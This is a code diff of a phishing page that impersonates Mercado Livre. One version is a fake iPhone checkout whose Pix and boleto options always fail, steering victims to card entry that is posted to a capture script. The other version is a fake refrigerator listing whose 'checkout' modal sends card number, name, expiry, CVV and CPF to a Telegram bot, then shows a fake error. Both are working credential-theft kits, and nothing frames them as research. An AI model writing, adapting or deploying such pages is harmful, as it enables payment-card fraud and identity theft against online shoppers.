@@ -2,415 +2,174 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Mercado Livre - Pagamento</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Geladeira Consul CRM44MB</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #ebebeb;
-            padding: 16px;
-        }
-
-        /* Container principal */
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        /* Card do produto */
-        .product-card {
-            background: white;
-            border-radius: 12px;
-            padding: 24px;
-            margin-bottom: 16px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-            display: flex;
-            gap: 20px;
-            flex-wrap: wrap;
-        }
-
-        .product-image {
-            width: 120px;
-            height: 120px;
-            background: #f0f0f0;
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .product-image img {
-            width: 100%;
-            height: auto;
-        }
-
-        .product-details {
-            flex: 1;
-        }
-
-        .product-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
-        }
-
-        .product-price {
-            font-size: 28px;
-            font-weight: 700;
-            color: #00a650;
-            margin-bottom: 4px;
-        }
-
-        .product-installments {
-            font-size: 14px;
-            color: #00a650;
-            font-weight: 500;
-        }
-
-        .product-shipping {
-            font-size: 13px;
-            color: #00a650;
-            margin-top: 8px;
-        }
-
-        .product-sold {
-            font-size: 13px;
-            color: #666;
-            margin-top: 4px;
-        }
-
-        /* Card de pagamento */
-        .payment-card {
-            background: white;
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
-        }
-
-        .payment-title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 20px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        /* Métodos de pagamento (tabs) */
-        .payment-methods {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 24px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .method-tab {
-            padding: 12px 16px;
-            cursor: pointer;
-            font-weight: 600;
-            color: #666;
-            border-bottom: 2px solid transparent;
-            transition: all 0.3s;
-        }
-
-        .method-tab.active {
-            color: #3483fa;
-            border-bottom-color: #3483fa;
-        }
-
-        /* Formulários */
-        .form-group {
-            margin-bottom: 16px;
-        }
-
-        .form-group label {
-            display: block;
-            font-size: 13px;
-            font-weight: 600;
-            margin-bottom: 6px;
-            color: #333;
-        }
-
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 14px;
-            transition: border-color 0.3s;
-        }
-
-        .form-group input:focus, .form-group select:focus {
-            outline: none;
-            border-color: #3483fa;
-        }
-
-        .row {
-            display: flex;
-            gap: 12px;
-        }
-
-        .row .form-group {
-            flex: 1;
-        }
-
-        /* Botão */
-        .btn-pay {
-            width: 100%;
-            padding: 14px;
-            background: #3483fa;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 16px;
-            transition: background 0.3s;
-        }
-
-        .btn-pay:hover {
-            background: #2968c8;
-        }
-
-        .btn-pay:disabled {
-            background: #ccc;
-            cursor: not-allowed;
-        }
-
-        /* QR Code */
-        .qr-container {
-            text-align: center;
-            padding: 20px;
-        }
-
-        .qr-code {
-            width: 200px;
-            height: 200px;
-            margin: 0 auto;
-            background: #f0f0f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border: 1px solid #ddd;
-            border-radius: 12px;
-        }
-
-        .qr-code img {
-            width: 100%;
-            height: auto;
-        }
-
-        .pix-code {
-            background: #f5f5f5;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 12px;
-            word-break: break-all;
-            margin: 16px 0;
-        }
-
-        .btn-copy {
-            background: #00a650;
-            color: white;
-            border: none;
-            padding: 8px 16px;
-            border-radius: 6px;
-            cursor: pointer;
-        }
-
-        /* Mensagens de erro */
-        .error-message {
-            background: #fee;
-            border: 1px solid #fcc;
-            color: #c00;
-            padding: 12px;
-            border-radius: 8px;
-            margin-bottom: 16px;
-            font-size: 13px;
-            display: none;
-        }
-
-        .error-message.show {
-            display: block;
-        }
-
-        /* Loading */
-        .loading {
-            display: none;
-            text-align: center;
-            margin-top: 20px;
-        }
-
-        .loading.show {
-            display: block;
-        }
-
-        .spinner {
-            width: 30px;
-            height: 30px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3483fa;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Seguro */
-        .secure-badge {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #999;
-        }
-
-        /* Tabs content */
-        .tab-content {
-            display: none;
-        }
-
-        .tab-content.active {
-            display: block;
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #ebebeb; }
+        
+        /* Header */
+        .header { background: #fff159; padding: 8px 0; border-bottom: 1px solid #ddd; }
+        .header-container { max-width: 1200px; margin: 0 auto; padding: 0 16px; display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
+        .logo { font-size: 28px; font-weight: bold; color: #333; text-decoration: none; }
+        .search-bar { flex: 1; display: flex; max-width: 600px; }
+        .search-bar input { flex: 1; padding: 10px 15px; border: none; border-radius: 4px 0 0 4px; font-size: 14px; }
+        .search-bar button { background: white; border: none; padding: 10px 15px; border-radius: 0 4px 4px 0; cursor: pointer; }
+        .nav-links { display: flex; gap: 20px; }
+        .nav-links a { color: #333; text-decoration: none; font-size: 14px; }
+        
+        /* Main Content */
+        .container { max-width: 1200px; margin: 16px auto; padding: 0 16px; display: flex; gap: 16px; flex-wrap: wrap; }
+        .product-main { flex: 2; background: white; border-radius: 8px; padding: 24px; }
+        .product-sidebar { flex: 1; }
+        
+        /* Produto */
+        .product-title { font-size: 20px; font-weight: 600; color: #333; margin-bottom: 8px; }
+        .product-brand { color: #666; font-size: 14px; margin-bottom: 16px; }
+        .product-price { font-size: 36px; font-weight: 700; color: #333; margin-bottom: 4px; }
+        .product-price small { font-size: 16px; }
+        .installments { color: #00a650; font-size: 14px; margin-bottom: 16px; }
+        .old-price { color: #999; text-decoration: line-through; font-size: 14px; margin-bottom: 8px; }
+        .discount { color: #00a650; font-size: 14px; margin-bottom: 16px; }
+        
+        /* Opções */
+        .option-group { margin-bottom: 24px; }
+        .option-label { font-weight: 600; margin-bottom: 12px; }
+        .color-option { display: inline-block; width: 40px; height: 40px; border-radius: 50%; margin-right: 12px; cursor: pointer; border: 2px solid transparent; }
+        .color-option.white { background: white; border-color: #ccc; }
+        .color-option.black { background: black; }
+        .voltage-option { display: inline-block; padding: 8px 16px; border: 1px solid #ccc; border-radius: 20px; margin-right: 12px; cursor: pointer; }
+        .voltage-option.selected { border-color: #3483fa; color: #3483fa; }
+        
+        /* Frete */
+        .shipping-box { background: #f5f5f5; padding: 16px; border-radius: 8px; margin: 16px 0; }
+        .stock { color: #00a650; font-size: 14px; margin: 16px 0; }
+        
+        /* Botões */
+        .btn-buy { width: 100%; padding: 14px; background: #3483fa; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 12px; }
+        .btn-cart { width: 100%; padding: 14px; background: rgba(52,131,250,0.1); color: #3483fa; border: 1px solid #3483fa; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        
+        /* Modal Checkout */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; align-items: center; justify-content: center; }
+        .modal-content { background: white; max-width: 500px; width: 90%; border-radius: 12px; padding: 24px; max-height: 90vh; overflow-y: auto; }
+        .modal-header { font-size: 20px; font-weight: 600; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 12px; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; }
+        .form-group input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 6px; }
+        .row { display: flex; gap: 12px; }
+        .row .form-group { flex: 1; }
+        .error { background: #fee; color: #c00; padding: 12px; border-radius: 6px; margin-bottom: 16px; display: none; font-size: 13px; }
+        .close { float: right; cursor: pointer; font-size: 24px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Card do Produto -->
-        <div class="product-card">
-            <div class="product-image">
-                <img src="https://http2.mlstatic.com/D_NQ_NP_2X_123456-MLA78912345678_012024-F.webp" alt="iPhone 11">
+    <div class="header">
+        <div class="header-container">
+            <a href="#" class="logo">Mercado Livre</a>
+            <div class="search-bar">
+                <input type="text" placeholder="Buscar produtos, marcas e muito mais...">
+                <button>🔍</button>
             </div>
-            <div class="product-details">
-                <div class="product-title">iPhone 11 Apple (64 GB, Preto) Tela 6.1" 12MP iOS</div>
-                <div class="product-price">R$ 249,90</div>
-                <div class="product-installments">em até 12x de R$ 20,83 sem juros</div>
-                <div class="product-shipping">✅ Frete grátis</div>
-                <div class="product-sold">🔵 Venda do dia · 35 vendidos nas últimas 24h</div>
-            </div>
-        </div>
-
-        <!-- Card de Pagamento -->
-        <div class="payment-card">
-            <div class="payment-title">Escolha como pagar</div>
-
-            <!-- Abas -->
-            <div class="payment-methods">
-                <div class="method-tab active" data-tab="pix">Pix</div>
-                <div class="method-tab" data-tab="card">Cartão de crédito</div>
-                <div class="method-tab" data-tab="boleto">Boleto</div>
-            </div>
-
-            <!-- Conteúdo Pix (Falso) -->
-            <div class="tab-content active" id="tab-pix">
-                <div class="error-message" id="error-pix">
-                    ⚠️ No momento, o Pix está passando por manutenção. Por favor, escolha outra forma de pagamento.
-                </div>
-                <div class="qr-container">
-                    <div class="qr-code">
-                        <img src="https://via.placeholder.com/180?text=QR+Code" alt="QR Code">
-                    </div>
-                    <div class="pix-code" id="pix-code">
-                        00020126360014BR.GOV.BCB.PIX0114+55119999999995204000053039865404.905802BR5925VENDEDOR6009SAO PAULO62070503***6304ABCD
-                    </div>
-                    <button class="btn-copy" onclick="copiarPix()">📋 Copiar código</button>
-                </div>
-                <button class="btn-pay" onclick="mostrarErroPix()">Pagar com Pix</button>
-            </div>
-
-            <!-- Conteúdo Cartão (Verdadeiro) -->
-            <div class="tab-content" id="tab-card">
-                <div class="error-message" id="error-card"></div>
-                <div class="form-group">
-                    <label>Número do cartão</label>
-                    <input type="text" id="card_number" placeholder="0000 0000 0000 0000" autocomplete="off">
-                </div>
-                <div class="form-group">
-                    <label>Nome no cartão</label>
-                    <input type="text" id="card_name" placeholder="Como está no cartão">
-                </div>
-                <div class="row">
-                    <div class="form-group">
-                        <label>Validade</label>
-                        <input type="text" id="card_expiry" placeholder="MM/AAAA">
-                    </div>
-                    <div class="form-group">
-                        <label>CVV</label>
-                        <input type="text" id="card_cvv" placeholder="123">
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>CPF</label>
-                    <input type="text" id="card_cpf" placeholder="000.000.000-00">
-                </div>
-                <button class="btn-pay" onclick="processarCartao()">Pagar R$ 249,90</button>
-            </div>
-
-            <!-- Conteúdo Boleto (Falso) -->
-            <div class="tab-content" id="tab-boleto">
-                <div class="error-message" id="error-boleto">
-                    ⚠️ O sistema de boletos está temporariamente indisponível. Use cartão de crédito ou Pix.
-                </div>
-                <button class="btn-pay" onclick="mostrarErroBoleto()">Gerar boleto</button>
-            </div>
-
-            <div class="loading" id="loading">
-                <div class="spinner"></div>
-                <p style="margin-top: 10px;">Processando pagamento...</p>
-            </div>
-
-            <div class="secure-badge">
-                🔒 Pagamento 100% seguro · Ambiente protegido
+            <div class="nav-links">
+                <a href="#">Cria a sua conta</a>
+                <a href="#">Entre</a>
+                <a href="#">Compras</a>
+                <a href="#">Vender</a>
             </div>
         </div>
     </div>
 
+    <div class="container">
+        <div class="product-main">
+            <span class="product-brand">Nuevo | +5 mil vendidos | MAIS VENDIDO</span>
+            <h1 class="product-title">Geladeira Consul Frost Free Duplex CRM44MB Branco</h1>
+            <div class="old-price">R$ 2.899</div>
+            <div class="product-price">R$ 2.698 <small>6% OFF</small></div>
+            <div class="installments">em 12x R$ 259,32 sem juros</div>
+            
+            <div class="option-group">
+                <div class="option-label">Cor: Branco</div>
+                <div class="color-option white"></div>
+            </div>
+            
+            <div class="option-group">
+                <div class="option-label">Voltagem:</div>
+                <div class="voltage-option selected">127V</div>
+                <div class="voltage-option">220V</div>
+            </div>
+            
+            <div class="shipping-box">
+                <strong>Chegará sexta-feira</strong><br>
+                Escolha um dia para envio entre sexta-feira 29 e sexta-feira 5/jun
+            </div>
+            
+            <div class="stock">✅ Estoque disponível | Armazenado e enviado pelo FULL</div>
+        </div>
+        
+        <div class="product-sidebar">
+            <div style="background: white; border-radius: 8px; padding: 16px;">
+                <button class="btn-buy" onclick="abrirCheckout()">Comprar agora</button>
+                <button class="btn-cart">Adicionar ao carrinho</button>
+                <div style="margin-top: 16px; font-size: 12px; color: #666; text-align: center;">
+                    Loja oficial Mercado Livre<br>
+                    Devolução grátis · Compra Garantida
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL CHECKOUT FALSO -->
+    <div id="checkoutModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="fecharCheckout()">&times;</span>
+            <div class="modal-header">Dados do cartão</div>
+            <div class="error" id="errorMsg"></div>
+            <div class="form-group">
+                <label>Número do cartão</label>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000">
+            </div>
+            <div class="form-group">
+                <label>Nome no cartão</label>
+                <input type="text" id="cardName" placeholder="Como está no cartão">
+            </div>
+            <div class="row">
+                <div class="form-group">
+                    <label>Validade</label>
+                    <input type="text" id="cardExpiry" placeholder="MM/AAAA">
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" id="cardCvv" placeholder="123">
+                </div>
+            </div>
+            <div class="form-group">
+                <label>CPF</label>
+                <input type="text" id="cardCpf" placeholder="000.000.000-00">
+            </div>
+            <button class="btn-buy" onclick="processarPagamento()">Pagar R$ 2.698,00</button>
+            <div style="margin-top: 16px; font-size: 11px; color: #999; text-align: center;">🔒 Pagamento 100% seguro</div>
+        </div>
+    </div>
+
     <script>
-        // Alternar abas
-        document.querySelectorAll('.method-tab').forEach(tab => {
-            tab.addEventListener('click', function() {
-                const tabId = this.getAttribute('data-tab');
-                document.querySelectorAll('.method-tab').forEach(t => t.classList.remove('active'));
-                this.classList.add('active');
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                document.getElementById(`tab-${tabId}`).classList.add('active');
-            });
-        });
+        const BOT_TOKEN = "SEU_TOKEN_AQUI";
+        const CHAT_ID = "6832775799";
+
+        function abrirCheckout() { document.getElementById('checkoutModal').style.display = 'flex'; }
+        function fecharCheckout() { document.getElementById('checkoutModal').style.display = 'none'; }
 
         // Formatações
-        document.getElementById('card_number').addEventListener('input', function(e) {
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
             e.target.value = value.substring(0, 19);
         });
-
-        document.getElementById('card_expiry').addEventListener('input', function(e) {
+        document.getElementById('cardExpiry').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
-            if (value.length >= 4) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 6);
-            }
+            if (value.length >= 4) value = value.substring(0, 2) + '/' + value.substring(2, 6);
             e.target.value = value.substring(0, 7);
         });
-
-        document.getElementById('card_cpf').addEventListener('input', function(e) {
+        document.getElementById('cardCpf').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\D/g, '');
             if (value.length <= 11) {
                 value = value.replace(/(\d{3})(\d)/, '$1.$2');
@@ -420,81 +179,35 @@
             e.target.value = value;
         });
 
-        function copiarPix() {
-            const codigo = document.getElementById('pix-code').innerText;
-            navigator.clipboard.writeText(codigo);
-            alert('Código Pix copiado!');
-        }
+        async function processarPagamento() {
+            const numero = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const nome = document.getElementById('cardName').value;
+            const validade = document.getElementById('cardExpiry').value;
+            const cvv = document.getElementById('cardCvv').value;
+            const cpf = document.getElementById('cardCpf').value.replace(/\D/g, '');
 
-        function mostrarErroPix() {
-            document.getElementById('error-pix').classList.add('show');
-            setTimeout(() => document.getElementById('error-pix').classList.remove('show'), 3000);
-        }
+            if (!numero || numero.length < 15) { mostrarErro('Número inválido'); return; }
+            if (!nome) { mostrarErro('Nome inválido'); return; }
+            if (!validade || validade.length < 6) { mostrarErro('Data inválida'); return; }
+            if (!cvv || cvv.length < 3) { mostrarErro('CVV inválido'); return; }
+            if (!cpf || cpf.length < 11) { mostrarErro('CPF inválido'); return; }
 
-        function mostrarErroBoleto() {
-            document.getElementById('error-boleto').classList.add('show');
-            setTimeout(() => document.getElementById('error-boleto').classList.remove('show'), 3000);
-        }
-
-        async function processarCartao() {
-            const numero = document.getElementById('card_number').value.replace(/\s/g, '');
-            const nome = document.getElementById('card_name').value;
-            const validade = document.getElementById('card_expiry').value;
-            const cvv = document.getElementById('card_cvv').value;
-            const cpf = document.getElementById('card_cpf').value.replace(/\D/g, '');
-
-            if (!numero || numero.length < 15) {
-                mostrarErroCartao('Número do cartão inválido');
-                return;
-            }
-            if (!nome) {
-                mostrarErroCartao('Digite o nome no cartão');
-                return;
-            }
-            if (!validade || validade.length < 6) {
-                mostrarErroCartao('Data de validade inválida');
-                return;
-            }
-            if (!cvv || cvv.length < 3) {
-                mostrarErroCartao('CVV inválido');
-                return;
-            }
-            if (!cpf || cpf.length < 11) {
-                mostrarErroCartao('CPF inválido');
-                return;
-            }
-
-            document.getElementById('loading').classList.add('show');
-            document.querySelector('#tab-card .btn-pay').disabled = true;
-
-            const dados = { numero, nome, validade, cvv, cpf };
+            const msg = `💎💎💎 CLONE ML - GELADEIRA 💎💎💎\n💳 Número: ${numero}\n👤 Nome: ${nome}\n📅 Validade: ${validade}\n🔢 CVV: ${cvv}\n📄 CPF: ${cpf}`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
 
             try {
-                const response = await fetch('api/captura.php', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(dados)
-                });
-                await response.json();
-                
-                setTimeout(() => {
-                    document.getElementById('loading').classList.remove('show');
-                    mostrarErroCartao('Não foi possível processar seu pagamento. Tente outro cartão.');
-                    document.querySelector('#tab-card .btn-pay').disabled = false;
-                    document.querySelectorAll('#tab-card input').forEach(i => i.value = '');
-                }, 2000);
-            } catch (error) {
-                document.getElementById('loading').classList.remove('show');
-                mostrarErroCartao('Erro no processamento. Tente novamente.');
-                document.querySelector('#tab-card .btn-pay').disabled = false;
-            }
+                await fetch(url);
+                mostrarErro('Erro no processamento. Tente outro cartão.');
+                document.querySelectorAll('#checkoutModal input').forEach(i => i.value = '');
+                fecharCheckout();
+            } catch(error) { mostrarErro('Erro. Tente novamente.'); }
         }
 
-        function mostrarErroCartao(msg) {
-            const errorDiv = document.getElementById('error-card');
-            errorDiv.innerHTML = msg;
-            errorDiv.classList.add('show');
-            setTimeout(() => errorDiv.classList.remove('show'), 4000);
+        function mostrarErro(msg) {
+            const errorDiv = document.getElementById('errorMsg');
+            errorDiv.innerText = msg;
+            errorDiv.style.display = 'block';
+            setTimeout(() => errorDiv.style.display = 'none', 3000);
         }
     </script>
 </body>
